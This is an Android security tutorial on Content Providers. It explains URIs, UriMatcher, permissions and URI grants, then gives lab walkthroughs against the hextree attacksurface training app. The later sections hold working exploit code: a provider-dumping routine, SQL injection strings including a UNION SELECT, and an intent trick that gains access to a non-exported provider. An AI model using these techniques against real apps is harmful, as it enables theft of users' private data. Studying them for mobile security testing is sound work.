---
title: "Content providers"
---

## Overview

A **Content Provider** \[[↗](https://developer.android.com/reference/android/content/ContentProvider)] is one of the four fundamental components of an Android application (along with Activities, Services, and Broadcast Receivers).

By default, Android uses a concept called "Application Sandboxing". This means App A cannot access App B’s database or files directly. However, sometimes you want to share data. For example WhatsApp needs to access your phone's **Contacts**.

The **Content Provider** is the standard interface that connects data in one process with code running in another process.

**Architecture**

The architecture involves three main parts:

* **The Data Layer**: The actual source of data (usually an SQLite database, but it can be files, JSON, etc.).
* **The Content Provider**: The class that sits on top of the data. It exposes methods like insert, query, update, and delete.
* **The Content Resolver**: The client (the app trying to get the data). It talks to the Provider using a specific address (URI).

**The Content URI**

To access data, you need a unique address called a URI (Uniform Resource Identifier). It looks like this:
`content://com.example.app.provider/users/1`

* `content://`: The scheme (tells Android this is a Content Provider).
* `com.example.app.provider`: The Authority. This acts like a domain name to identify which specific provider to call.
* `users`: The Path. Indicates which table or type of data you want.
* `1`: The ID. (Optional) Indicates the specific row you want.

**Key Methods**

A Content Provider must implement these six abstract methods:

* `onCreate()`: Initialize the provider (e.g., open the database connection).
* `query()`: Read data. Returns a Cursor object.
* `insert()`: Add new data.
* `update()`: Modify existing data.
* `delete()`: Remove data.
* `getType()`: Returns the MIME type of the data (used for handling file types).

---

### How to use it

#### Access 

Imagine you want to read the User's Contacts. You don't query the database directly. You use the `ContentResolver`.

```java
// 1. Define the URI for Contacts
Uri contactsUri = ContactsContract.Contacts.CONTENT_URI; // -> content://com.android.contacts/contacts

// 2. Use the ContentResolver to query
Cursor cursor = getContentResolver().query(
    contactsUri, // The address
    null,        // Columns to return (null = all)
    null,        // Selection criteria (WHERE clause)
    null,        // Selection arguments
    null         // Sort order
);

// 3. Iterate through the results
if (cursor != null && cursor.moveToFirst()) {
    do {
        String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
        Log.d("Contact", name);
    } while (cursor.moveToNext());
    
    cursor.close();
}
```

Content Providers are identified and accessed through a `content://` URI. You can query this URI using `getContentResolver().query()`. The method returns data in a table-like structure, which can then be navigated using a `Cursor` object.


#### Implementation

If you want to share your app's data with other apps, you must create a subclass of `ContentProvider`.

```java
public class MyDataProvider extends ContentProvider {
    
    private SQLiteDatabase db;

    @Override
    public boolean onCreate() {
        // Initialize your Database Helper here
        DatabaseHelper dbHelper = new DatabaseHelper(getContext());
        db = dbHelper.getWritableDatabase();
        return (db != null);
    }

    @Override
    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        // Perform SQLite query
        return db.query("tasks_table", projection, selection, selectionArgs, null, null, sortOrder);
    }
    
    // Implement insert, update, delete similarly...
}
```

Moreover, you must declare the provider in `AndroidManifest.xml`

```xml
<provider
    android:name=".MyDataProvider"
    android:authorities="com.example.myapp.provider"
    android:exported="true" />
```

---

### UriMatcher

A [UriMatcher](https://developer.android.com/reference/android/content/UriMatcher) is a utility class in Android that helps your app match incoming Uris against predefined patterns. It’s commonly used in ContentProviders to determine which type of request is being made and route it to the appropriate logic.

**How it works**

You create a `UriMatcher` and add URI patterns with integer constants:

```java
private static final int USERS = 1;
private static final int USER_ID = 2;
private static final UriMatcher uriMatcher = new UriMatcher(UriMatcher.NO_MATCH);

static {
    uriMatcher.addURI("com.example.app", "users", USERS);       // Matches all users
    uriMatcher.addURI("com.example.app", "users/#", USER_ID);   // Matches a specific user
}
```

Then, inside the ContentProvider:

```
@Override
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
    switch (uriMatcher.match(uri)) {
        case USERS:
            // return all users
            break;
        case USER_ID:
            // return a specific user
            break;
        default:
            throw new IllegalArgumentException("Unknown URI: " + uri);
    }
}
```

> **Note**:
>
> * `#` in the pattern matches a number.
> * `*` in the pattern matches any text.
> * `UriMatcher.NO_MATCH` is used as a default for unmatched URIs.

### Package visibility

Android 11 introduced package visibility restrictions for privacy reasons \[[↗](https://developer.android.com/training/package-visibility)]. Apps can no longer see all installed apps or all exported components (like Content Providers) unless explicitly declared.

**There are many more details regarding package visibility, but here we will focus specifically on Content Providers in a typical scenario**. For Content Providers, this means:

* Even if a provider is `exported="true"`, your app cannot interact with it unless it is declared in `<queries>`.
* Without this declaration, trying to access the provider will fail.

```
Failed to find provider info for io.hextree.flag30
```

The `<queries>` element goes in your app’s `AndroidManifest.xml`, outside the `<application>` tag. You can declare visibility in two main ways:

1. **By package name**

If you know the exact app that provides the provider:

```xml
<queries>
    <package android:name="com.example.otherapp" />
</queries>
```

2. **By provider authorities**

If you want to access a specific provider:

```xml
<queries>
    <provider android:authorities="com.example.otherapp.provider" />
</queries>
```

---

## Usage

### Content provider query

Let's say that the app `io.hextree.attacksurface` has the following ContentProvider:

```xml
<provider
    android:name="io.hextree.attacksurface.providers.Flag30Provider"
    android:enabled="true"
    android:exported="true"
    android:authorities="io.hextree.flag30"/>
```

```java
public class Flag30Provider extends ContentProvider {
    ...

    @Override // android.content.ContentProvider
    public Cursor query(Uri uri, String[] strArr, String str, String[] strArr2, String str2) {
        Log.i("Flag30", "Flag30Provider.query('" + uri.getPath() + "')");
        if (!uri.getPath().equals("/success")) {
            return null;
        }
        LogHelper logHelper = new LogHelper(getContext());
        Cursor cursorQuery = this.dbHelper.getReadableDatabase().query(FlagDatabaseHelper.TABLE_FLAG, strArr, "name=? AND visible=1", new String[]{"flag30"}, null, null, str2);
        cursorQuery.setNotificationUri(getContext().getContentResolver(), uri);
        success(logHelper);
        return cursorQuery;
    }
}
```

To retrieve the flag, you simply need to perform a query as shown below:

```java
Uri uri = Uri.parse("content://io.hextree.flag30/success");
Cursor cursor = getContentResolver().query(uri, null, null, null, null);
```

> **Important**: remember to declare `<queries>`.

### Content providers & UriMatcher

Let's say that the app `io.hextree.attacksurface` has the following ContentProvider:

```xml
<provider
    android:name="io.hextree.attacksurface.providers.Flag31Provider"
    android:enabled="true"
    android:exported="true"
    android:authorities="io.hextree.flag31"/>
```

```java
public class Flag31Provider extends ContentProvider {
    ...

    static {
        UriMatcher uriMatcher2 = new UriMatcher(-1);
        uriMatcher = uriMatcher2;
        uriMatcher2.addURI(AUTHORITY, "flags", 1);
        uriMatcher2.addURI(AUTHORITY, "flag/#", 2);
    }

    @Override // android.content.ContentProvider
    public Cursor query(Uri uri, String[] strArr, String str, String[] strArr2, String str2) {
        StringBuilder sbAppend = new StringBuilder("Flag31Provider.query('").append(uri.getPath()).append("'): ");
        UriMatcher uriMatcher2 = uriMatcher;
        Log.i("Flag31", sbAppend.append(uriMatcher2.match(uri)).toString());
        SQLiteDatabase readableDatabase = this.dbHelper.getReadableDatabase();
        int iMatch = uriMatcher2.match(uri);
        if (iMatch == 1) {
            throw new IllegalArgumentException("FLAGS not implemented yet: " + uri);
        }
        if (iMatch == 2) {
            long id = ContentUris.parseId(uri);
            Log.i("Flag31", "FLAG_ID: " + id);
            if (id == 31) {
                success(logHelper);
            }
            return readableDatabase.query(FlagDatabaseHelper.TABLE_FLAG, strArr, "name=? AND visible=1", new String[]{"flag" + id}, null, null, str2);
        }
        throw new IllegalArgumentException("Unknown URI: " + uri);
    }
}
```

To retrieve the flag, you simply need to perform a query as shown below:

```java
Uri uri = Uri.parse("content://io.hextree.flag31/flag/31");
Cursor cursor = getContentResolver().query(uri, null, null, null, null);
```

### General example to dump content provider

Source: \[[↗](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/#capturing-app-permissions)]

```java
public void dump(Uri uri) {
    Cursor cursor = getContentResolver().query(uri, null, null, null, null);
    if (cursor.moveToFirst()) {
        do {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < cursor.getColumnCount(); i++) {
                if (sb.length() > 0) {
                    sb.append(", ");
                }
                sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
            }
            Log.d("evil", sb.toString());
        } while (cursor.moveToNext());
    }
}
```

---

## Sharing Provider access

### android:permission, android:readPermission, android:writePermission

The `<provider>` tag offers three attributes that act as the main security gatekeepers for your data.

`android:permission` is the "all or nothing" attribute. It applies a single permission requirement to both reading and writing data.

```xml
<provider
    android:name=".MyProvider"
    android:authorities="com.example.provider"
    android:permission="com.example.app.ACCESS_MY_DATA"
    android:exported="true" />
```

If a client app wants to interact with this provider in any way (`Query`, `Insert`, `Update`, or `Delete`), it must request and hold the `com.example.app.ACCESS_MY_DATA` permission in its Manifest.

`android:readPermission` & `android:writePermission` attributes allow you to split the security model.

* `android:readPermission` restricts `query()` operations (and `openFile()` in "`r`" mode).
* `android:writePermission` restricts `insert()`, `update()`, `delete()` operations (and `openFile()` in "`w`" mode).

Example configuration:

```xml
<provider
    android:name=".SocialProvider"
    android:authorities="com.example.social"
    android:readPermission="android.permission.GLOBAL_SEARCH"
    android:writePermission="com.example.social.WRITE_POSTS"
    android:exported="true" />
```

In this scenario any app with `GLOBAL_SEARCH` permission can read the posts, but only an app with `WRITE_POSTS` can create or delete them.

### grantUriPermissions

The attribute `android:grantUriPermissions` is a security feature in the Android Manifest within `<provider>` elements. It controls whether your app can create a "temporary guest pass" for other apps to access specific data they are normally forbidden from touching.

```xml
<provider
    android:name=".MyContentProvider"
    android:authorities="com.example.provider"
    android:exported="true"
    android:grantUriPermissions="true"> <!-- OR false -->
</provider>
```

Attribute behavior:

* `true`: The system allows permission grants for any data hosted by this provider.
* `false` (Default): Dynamic permission grants are generally disabled. However, you can whitelist specific data subsets (paths) using the `<grant-uri-permission>` child element. 

    **Example: whitelisting specific paths**

    If the main attribute is set to false, you can define granular access like this:

    ```xml
    <provider
        android:name=".MyContentProvider"
        android:authorities="com.example.provider"
        android:grantUriPermissions="false">
        
        <!-- Only allow granting permissions for files in the /reports/ folder -->
        <grant-uri-permission android:pathPrefix="/reports/" />
        
    </provider>
    ```

**Granting the permission in code**

When a sending app (App A) wants to share a file with a target app (App B), for example via an "Open With" action, **App A must append a flag** to the Intent.

```java
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setDataAndType(uri, "application/pdf");

// This flag authorizes the temporary access
intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION); 

startActivity(intent);
```

**Under the Hood**

1. App A sends Intent to Android OS.
2. The OS checks App A's Manifest. Is `grantUriPermissions="true"`? Or is the URI in `<grant-uri-permission>`? 
3. If valid, the OS creates a temporary permission record linking the Content URI, App A, and the Target App (App B).
4. App B starts and can now call `getContentResolver()`.


<details><summary>Practical example</summary>

Imagine two applications:

* **App A**: Holds secret data. It is protected by a strict custom permission that no normal app possesses. However, App A wants to share one specific record with App B.
* **App B**: Does not have the permissions required to enter App A’s vault, but it receives a temporary invitation to view that single record.

**App A**

Here, we define a strict signature-level permission and apply it to the provider. Crucially, we set `grantUriPermissions="true"`, which allows us to override that strict permission on a case-by-case basis.

```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.appa">

    <!-- 1. Define a strict, signature-level permission -->
    <permission 
        android:name="com.example.appa.READ_SECRET"
        android:protectionLevel="signature" />

    <application ... >
        
        <!-- 2. The Provider Configuration -->
        <!-- exported="true": The provider is visible to other apps. -->
        <!-- permission="...": but, only apps with the signature permission can enter. -->
        <!-- grantUriPermissions="true": Allows us to issue temporary keys to bypass the permission lock. -->
        <provider
            android:name=".SecretProvider"
            android:authorities="com.example.appa.provider"
            android:exported="true"
            android:grantUriPermissions="true"
            android:permission="com.example.appa.READ_SECRET" />

        <activity android:name=".MainActivity" android:exported="true">
            <!-- ... -->
        </activity>
    </application>
</manifest>
```

**MainActivity.java**

This Activity constructs an Intent to launch App B. It attaches the secret data and the "guest pass" flag.

```java
public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Button btn = new Button(this);
        btn.setText("Grant Permission to App B");
        setContentView(btn);

        btn.setOnClickListener(v -> {
            // The specific data record we want to share
            Uri secretUri = Uri.parse("content://com.example.appa.provider/secrets/1");

            Intent intent = new Intent();
            // Explicitly targeting App B
            intent.setComponent(new ComponentName("com.example.appb", "com.example.appb.MainActivity"));
            
            // 1. Attach the specific data
            intent.setData(secretUri);
            
            // 2. Add the "Guest Pass" Flag
            // This tells Android: "Allow the recipient of this Intent to read this specific URI."
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

            startActivity(intent);
        });
    }
}
```

**App B**

App B is a standard app. It has no <uses-permission> tags for App A's data in its manifest.

**MainActivity.java**

This activity receives the URI via the Intent. Because the Intent carries the permission flag, App B can query the provider successfully.

```java
public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        TextView tv = new TextView(this);
        setContentView(tv);

        // Get the URI sent from App A
        Uri uriFromIntent = getIntent().getData();

        if (uriFromIntent != null) {
            try {
                // Attempt to query the data.
                // The OS checks the temporary whitelist created by the flag.
                Cursor cursor = getContentResolver().query(uriFromIntent, null, null, null, null);
                
                if (cursor != null && cursor.moveToFirst()) {
                    // Assuming column index 1 contains the "secret_message"
                    String secret = cursor.getString(1); 
                    tv.setText("Success! Received: " + secret);
                    cursor.close();
                }
            } catch (SecurityException e) {
                // This block runs if the flag was missing or grantUriPermissions="false"
                tv.setText("Failed: Permission Denied");
            }
        } else {
            tv.setText("Waiting for data...");
        }
    }
}
```

**How it works**

1. App A's provider is locked via `android:permission`. Since App B does not have this signature-level permission, it is normally blocked by the OS.
2. App A sets `android:grantUriPermissions="true"`. It tells Android that, even though the provider is locked, it reserves the right to let other apps in if I say so.
3. App A sends an Intent with `intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)`.
4. When App B starts, the OS sees the flag. It creates a temporary whitelist entry allowing App B access to only that specific URI. When App B calls `query()`, the OS checks this whitelist and approves the request.

</details>

---

## Vulnerabilities

### SQL Injection in content providers

Let's say that the app `io.hextree.attacksurface` has the following ContentProvider:

```xml
<provider
    android:name="io.hextree.attacksurface.providers.Flag32Provider"
    android:enabled="true"
    android:exported="true"
    android:authorities="io.hextree.flag32"/>
```

```java
public class Flag32Provider extends ContentProvider {
    ...

    static {
        UriMatcher uriMatcher2 = new UriMatcher(-1);
        uriMatcher = uriMatcher2;
        uriMatcher2.addURI(AUTHORITY, "flags", 1);
        uriMatcher2.addURI(AUTHORITY, "flag/#", 2);
    }

    @Override // android.content.ContentProvider
    public Cursor query(Uri uri, String[] strArr, String str, String[] strArr2, String str2) {
        StringBuilder sbAppend = new StringBuilder("Flag32Provider.query('").append(uri.getPath()).append("'): ");
        UriMatcher uriMatcher2 = uriMatcher;
        SQLiteDatabase readableDatabase = this.dbHelper.getReadableDatabase();
        int iMatch = uriMatcher2.match(uri);
        if (iMatch != 1) {
            if (iMatch == 2) {
                long id = ContentUris.parseId(uri);
                return readableDatabase.query(FlagDatabaseHelper.TABLE_FLAG, strArr, "name=? AND visible=1", new String[]{"flag" + id}, null, null, str2);
            }
            throw new IllegalArgumentException("Unknown URI: " + uri);
        }
        String str3 = "visible=1" + (str != null ? " AND (" + str + ")" : "");
        Cursor cursorQuery = readableDatabase.query(FlagDatabaseHelper.TABLE_FLAG, strArr, str3, strArr2, null, null, str2);
        if (containsFlag32(cursorQuery)) {
            success(logHelper);
            cursorQuery.requery();
        }
        return cursorQuery;
    }
}
```

To retrieve the flag, you need to perform a SQLi as shown below:

```java
    protected void onCreate(Bundle savedInstanceState) {
        ....

        String selection = "1) or 1=1--";
        dump(Uri.parse("content://io.hextree.flag32/flags"), selection);
    }

    public void dump(Uri uri, String selection) {
        Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
        if (cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.d("evil", sb.toString());
            } while (cursor.moveToNext());
        }
    }
```

Log:

```
evil    com.example.myapplication   D  _id = 1, name = flag30, value = HXT{query-provider-table-1vsd8}, visible = 1
evil    com.example.myapplication   D  _id = 2, name = flag31, value = HXT{query-uri-matcher-sakj1}, visible = 1
evil    com.example.myapplication   D  _id = 3, name = flag32, value = HXT{sql-injection-in-provider-1gs82}, visible = 0
```

### SQL Injection in a not exported provider (1)

Let's start by analyzing the manifest for the `io.hextree.attacksurface` app. We see a `ContentProvider` defined as follows:

```xml
<provider
    android:name="io.hextree.attacksurface.providers.Flag33Provider1"
    android:enabled="true"
    android:exported="false"
    android:authorities="io.hextree.flag33_1"
    android:grantUriPermissions="true"/>
```

Notice that while `android:exported` is `false`, `android:grantUriPermissions` is set to `true`. This configuration suggests we might be able to access the provider if we can trick a privileged component into granting us permission. So now let's take a look at the `Flag33Activity1`:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag33Activity1"
    android:exported="true">
    <intent-filter>
        <action android:name="io.hextree.FLAG33"/>
    </intent-filter>
</activity>
```

```java
public class Flag33Activity1 extends AppCompactActivity {
    ...
    public Flag33Activity1() {...}

    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        Intent intent = getIntent();
        String stringExtra = intent.getStringExtra("secret");
        if (stringExtra == null) {
            if (intent.getAction() == null || !intent.getAction().equals("io.hextree.FLAG33")) {
                return;
            }
            intent.setData(Uri.parse("content://io.hextree.flag33_1/flags"));
            intent.addFlags(1);
            setResult(-1, intent);
            finish();
            return;
        }
        if (Flag33Provider1.secret.equals(stringExtra)) {...}
    }
}
```

In the `onCreate` method, the activity checks if the intent action is `io.hextree.FLAG33`. If it matches, the app sets the intent data to the provider's URI and calls `intent.addFlags(1)`. This integer corresponds to `Intent.FLAG_GRANT_READ_URI_PERMISSION`. Essentially, this activity creates a "ticket" that allows anyone who calls it to read the private provider.

According to the proper settings, we can write the following code to send the intent to `Flag33Activity1`. After `onCreate()` executes in `Flag33Activity1`, our app will be granted access to the provider.

```java
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        ...
        Intent intent = new Intent();
        intent.setAction("io.hextree.FLAG33");
        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag33Activity1"));
        startActivityForResult(intent, 1);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        String flag = String.valueOf(data.getFlags());
        Log.d("flag", flag); // It will print "1"
        Uri uri = data.getData();
        Log.d("uri", uri.toString());
        dump(uri, null, null);
    }

    public void dump(Uri uri, String[] projection, String selection) {...}
}
```

Output:

```
...  flag   ... D  1
...  uri    ... D  content://io.hextree.flag33_1/flags
...  evil   ... D  _id = 1, name = flag30, value = HXT{...}, visible = 1
...  evil   ... D  _id = 2, name = flag31, value = HXT{...}, visible = 1
...  evil   ... D  _id = 3, name = flag32, value = HXT{...}, visible = 0
```

Running this code successfully dumps the default flags table. However, to capture the final flag, we need to access a hidden "notes" table. A closer look at the `Flag33Provider1` source code reveals a SQL injection vulnerability because the app passes user-supplied parameters directly into `SQLiteDatabase.query()`.

```java
public Cursor query(Uri uri, String[] strArr, String str, String[] strArr2, String str2) {
    StringBuilder sbAppend = new StringBuilder("Flag33Provider1.query('").append(uri.getPath()).append("'): ");
    UriMatcher uriMatcher2 = uriMatcher;
    Log.i("Flag33Provider1", sbAppend.append(uriMatcher2.match(uri)).toString());
    SQLiteDatabase readableDatabase = this.dbHelper.getReadableDatabase();
    int iMatch = uriMatcher2.match(uri);
    if (iMatch != 1) {
        if (iMatch == 2) {
            throw new IllegalArgumentException("access to Notes table not yet implemented");
        }
        throw new IllegalArgumentException("Unknown URI: " + uri);
    }
    Cursor cursorQuery = readableDatabase.query(FlagDatabaseHelper.TABLE_FLAG, strArr, str, strArr2, null, null, str2);
    return cursorQuery;
}
```

We can exploit modifying `onActivityResult()` method to inject a UNION query as show below:

```java
protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
    super.onActivityResult(requestCode, resultCode, data);

    Uri uri = data.getData();
    String[] projection = {"name"};
    String selection = "'' UNION SELECT content FROM Note";
    dump(uri, projection ,selection);
}
```

> **Note**: Instead of using `onActivityResult()` we can simply wait for the permission grant by introducing a delay (`sleep`) immediately after starting the activity. This allows us to exploit the SQL injection directly within `onCreate()` once the permission has likely been granted.
>
> ```
> protected void onCreate(Bundle savedInstanceState) {
>     ...
>     Intent intent = new Intent();
>     intent.setAction("io.hextree.FLAG33");
>     intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag33Activity1"));
>     startActivityForResult(intent, 1);
> 
>     try {
>         Thread.sleep(5000);
> 
>         Uri uri = Uri.parse("content://io.hextree.flag33_1/flags");
>         String[] projection = {"name"};
>         String selection = "'' UNION SELECT content FROM Note";
>         dump(uri, projection ,selection);
> 
>     } catch (InterruptedException e) {
>         throw new RuntimeException(e);
>     }
> }
> ```